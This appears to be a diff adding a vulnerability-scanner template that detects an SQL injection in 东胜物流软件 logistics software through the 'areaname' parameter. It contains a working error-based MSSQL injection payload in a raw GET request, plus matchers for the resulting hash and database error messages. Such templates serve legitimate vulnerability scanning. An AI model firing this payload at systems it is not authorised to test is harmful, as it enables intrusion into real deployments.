@@ -1,0 +1,35 @@
+id: poc-yaml-dongshengsoft-areaname-sqli
+info:
+  name: 东胜物流软件 areaname SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL injection vulnerability in the 东胜物流软件 by exploiting the 'areaname' parameter.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        GET /WMS_ZX/WmsZXFeeGridSource.aspx?read=areaname&areaname='+AND+9173+IN+(SELECT+(sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))))+AND+'rhYc'='rhYc HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "0x{{t2}}"
+          - "SqlException"
+        part: body
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
+        part: body
